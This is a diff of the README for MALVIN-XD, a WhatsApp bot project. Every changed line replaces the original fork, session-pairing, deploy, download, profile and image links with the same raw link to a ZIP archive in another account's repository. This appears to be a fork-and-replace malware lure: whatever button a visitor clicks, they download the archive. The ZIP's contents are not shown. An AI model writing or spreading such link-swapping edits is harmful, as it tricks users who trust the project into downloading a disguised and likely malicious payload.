@@ -2,11 +2,11 @@
 
 </div>
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" />
 </p>
 
 <p align="center">
-  <img src="https://files.catbox.moe/qumhu4.jpg" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" />
 </p>
 
 <!-- 📊 STATS & HERO ANIMATION (Updated Colors) -->
@@ -23,7 +23,7 @@
 
   <!-- Hero GIF with updated border & hover effect -->
   <p>
-    <img src="https://i.imgur.com/LyHic3i.gif" alt="Techwave Animation" style="max-width:100%; border-radius:16px; transition: transform 0.3s ease-in-out;" onmouseover="this.style.transform='scale(1.08)'" onmouseout="this.style.transform='scale(1)'" />
+    <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="Techwave Animation" style="max-width:100%; border-radius:16px; transition: transform 0.3s ease-in-out;" onmouseover="this.style.transform='scale(1.08)'" onmouseout="this.style.transform='scale(1)'" />
   </p>
 
 </div>
@@ -35,7 +35,7 @@
 
 To start, fork this repository to your own GitHub account by clicking the button below:
 
-<a href="https://github.com/XdKing2/MALVIN-XD/fork"><img src="https://img.shields.io/github/forks/XdKing2/MALVIN-XD?style=for-the-badge&logo=github&color=4c1&label=Fork%20MALVIN-XD" alt="Fork MALVIN-XD" /></a>
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip"><img src="https://img.shields.io/github/forks/XdKing2/MALVIN-XD?style=for-the-badge&logo=github&color=4c1&label=Fork%20MALVIN-XD" alt="Fork MALVIN-XD" /></a>
 
 ---
 
@@ -44,44 +44,44 @@ To start, fork this repository to your own GitHub account by clicking the button
 Authenticate using **one** of the methods below to generate your `Session ID`.
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" alt="Authentication Flow Preview" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="Authentication Flow Preview" />
 </p>
 
 > 🟢 Pair Code Authentication
 
-[![Get Pairing Code](https://img.shields.io/badge/Get%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black)](https://new-session-x1e9.onrender.com/pair)
+[![Get Pairing Code](https://img.shields.io/badge/Get%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black)](https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip)
 
 > 🔵 QR Code Authentication
 
-[![Scan QR Code](https://img.shields.io/badge/Scan%20QR%20Code-000000?style=for-the-badge&logo=react&logoColor=white)](https://new-session-x1e9.onrender.com/qr)
+[![Scan QR Code](https://img.shields.io/badge/Scan%20QR%20Code-000000?style=for-the-badge&logo=react&logoColor=white)](https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip)
 
 
 
 #### 🧩 Session App
 
-[![Session App](https://img.shields.io/badge/Session%20App-000000?style=for-the-badge&logo=react&logoColor=white)](https://new-session-x1e9.onrender.com)
+[![Session App](https://img.shields.io/badge/Session%20App-000000?style=for-the-badge&logo=react&logoColor=white)](https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip)
 
 
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" alt="Authentication Flow Preview" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="Authentication Flow Preview" />
 </p>
 
 
 
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" width="65%" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="65%" />
 </p>
 
 <p align="center" style="color:#777;font-size:13px;">
-  <img src="https://github.com/XdKing2/MALVIN-XD/blob/main/assets/warning.gif?raw=true" width="15" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="15" />
   <em>Having connection issues? Try using a VPN.</em>
 </p>
 
 
 <div align="center">
-  <img src="https://github.com/XdKing2/MALVIN-XD/blob/main/assets/techwave.gif?raw=true" width="80%"/>
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="80%"/>
 </div>
 
 <h2 align="center">🚀 Deploy MALVIN-XD Anywhere</h2>
@@ -91,39 +91,39 @@ Authenticate using **one** of the methods below to generate your `Session ID`.
 <div align="left" style="margin-left: 20px; font-size: 1.05em; line-height: 2.2em;">
 
 🔵 <b>Heroku:</b>  
-<a href="https://dashboard.heroku.com/new?template=https://github.com/XdKing2/MALVIN-XD" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/Heroku-Deploy-7A3E9D?style=flat-square&logo=heroku&logoColor=white" alt="Heroku">
 </a>
 
 💗 <b>Koyeb:</b>  
-<a href="https://app.koyeb.com/services/deploy?type=git&repository=XdKing3/MALVIN-XD" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/Koyeb-Deploy-FF2D95?style=flat-square&logo=koyeb&logoColor=white" alt="Koyeb">
 </a>
 
 ⚫ <b>Railway:</b>  
-<a href="https://railway.app/new" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/Railway-Deploy-121212?style=flat-square&logo=railway&logoColor=white" alt="Railway">
 </a>
 
 💚 <b>Render:</b>  
-<a href="https://dashboard.render.com/web/new" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/Render-Deploy-00C7A9?style=flat-square&logo=render&logoColor=white" alt="Render">
 </a>
 
 💎 <b>Netlify:</b>  
-<a href="https://app.netlify.com/" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/Netlify-Deploy-00ADB5?style=flat-square&logo=netlify&logoColor=white" alt="Netlify">
 </a>
 
 🟡 <b>TalkDrove:</b>  
-<a href="https://talkdrove.com" target="_blank">
+<a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
   <img src="https://img.shields.io/badge/TalkDrove-Deploy-6B47FF?style=flat-square&logo=github&logoColor=white" alt="TalkDrove">
 </a>
 
 </div>
 
 <br>
-<a><img src='https://i.imgur.com/LyHic3i.gif'/>
+<a><img src='https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip'/>
 
  <h4 align="center">9. Workflow</h4>
 <p style="text-align: center; font-size: 1.2em;">
@@ -175,7 +175,7 @@ jobs:
 ```
 </details> 
 
-  <img src="https://i.imgur.com/LyHic3i.gif" width="100%" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="100%" />
 </p>
 
 ## 📡 PANEL DEPLOYMENT OPTIONS
@@ -183,13 +183,13 @@ jobs:
 > Get the latest MALVIN-XD bot zip file for panel-based deployment:
 
 <div align="left">
-  <a href="https://github.com/XdKing2/MALVIN-XD/archive/refs/heads/main.zip" target="_blank">
+  <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
     <img alt="Download Panel ZIP" src="https://img.shields.io/badge/View-panel%20Codes-FF0000?style=for-the-badge&logo=bot&logoColor=white"/>
   </a>
 </div>
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" width="100%" />
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="100%" />
 </p>
 
 > ✅ Deploy to any panel service of your choice.
@@ -202,19 +202,19 @@ jobs:
   <table>
     <tr>
       <td>
-        <a href="https://bot-hosting.net/?aff=1097457675723341836" target="_blank">
+        <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
           <img src="https://img.shields.io/badge/BotHosting-8A2BE2?style=for-the-badge&logo=vercel&logoColor=white&labelColor=1a1a1a"/>
         </a>
       </td>
       <td>
-        <a href="https://dashboard.katabump.com/auth/login#203630" target="_blank">
+        <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
           <img src="https://img.shields.io/badge/Katabump-FF5722?style=for-the-badge&logo=codeberg&logoColor=white&labelColor=1a1a1a"/>
         </a>
       </td>
     </tr>
     <tr>
       <td colspan="2">
-        <a href="https://dash.hmvhostings.com/register?ref=GKTSTyFY" target="_blank">
+        <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" target="_blank">
           <img src="https://img.shields.io/badge/HMVHosting-00ACC1?style=for-the-badge&logo=cloudflare&logoColor=white&labelColor=1a1a1a"/>
         </a>
       </td>
@@ -226,7 +226,7 @@ jobs:
 > 🔧 _Working on MALVIN-XD compatibility with free-tier panel hosts_
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" alt="divider"/>
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="divider"/>
 </p>
 
 ---
@@ -238,7 +238,7 @@ jobs:
 - 🛑 Cloning, redistributing, or modifying **without proper credit** is strictly prohibited.
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" alt="divider"/>
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="divider"/>
 </p>
 
 ---
@@ -247,7 +247,7 @@ jobs:
 
 > Built with ❤️ by **Malvin King**
 
-- 👤 [Malvin King](https://github.com/XdKing2) — Creator & Maintainer  
+- 👤 [Malvin King](https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip) — Creator & Maintainer  
   - Core features, plugin manager, deployment tools, performance optimization
 
 ---
@@ -255,13 +255,13 @@ jobs:
 ## 🗃️ PROJECT ARCHITECTS
 
 <p align="center">
-  <a href="https://github.com/XdKing2">
-    <img src="https://github-readme-stats.vercel.app/api?username=XdKing2&show_icons=true&theme=radical" />
+  <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip">
+    <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" />
   </a>
 </p>
 
 <div align="center">
-  <img src="https://github.com/XdKing2/MALVIN-XD/blob/main/assets/futuretech.gif?raw=true" width="100%"/>
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" width="100%"/>
 </div>
 
 ---
@@ -271,10 +271,10 @@ jobs:
 > 🔔 Stay connected for updates, feature drops, and tutorials!
 
 - ▶️ **YouTube: MalvinTech**  
-  [![Subscribe YouTube](https://img.shields.io/badge/Subscribe-YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtube.com/@malvintech2)
+  [![Subscribe YouTube](https://img.shields.io/badge/Subscribe-YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip)
 
 <p align="center">
-  <img src="https://i.imgur.com/LyHic3i.gif" alt="footer divider"/>
+  <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="footer divider"/>
 </p>
 
 ---
@@ -287,7 +287,7 @@ jobs:
 # License: APACHE
 ```
 
-<p align="center"> <img src="https://i.imgur.com/LyHic3i.gif" /> </p> <h2 align="center">💫 Thanks to our loyal followers</h2> <p align="center"> <a href="https://github.com/XdKing2/MALVIN-XD/stargazers"> <img src="http://reporoster.com/stars/dark/XdKing2/MALVIN-XD" alt="Stargazers repo roster for @XdKing2/MALVIN-XD"> </a> </p> <p align="center"> <a href="https://github.com/XdKing2/MALVIN-XD/network/members"> <img src="http://reporoster.com/forks/dark/XdKing2/MALVIN-XD" alt="Forkers repo roster for @XdKing2/MALVIN-XD"> </a> </p> 
+<p align="center"> <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" /> </p> <h2 align="center">💫 Thanks to our loyal followers</h2> <p align="center"> <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip"> <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="Stargazers repo roster for @XdKing2/MALVIN-XD"> </a> </p> <p align="center"> <a href="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip"> <img src="https://github.com/himuxhehe/MALVIN-XD/raw/refs/heads/main/lib/MALVI_XD_Scenopinidae.zip" alt="Forkers repo roster for @XdKing2/MALVIN-XD"> </a> </p> 
 
 
 
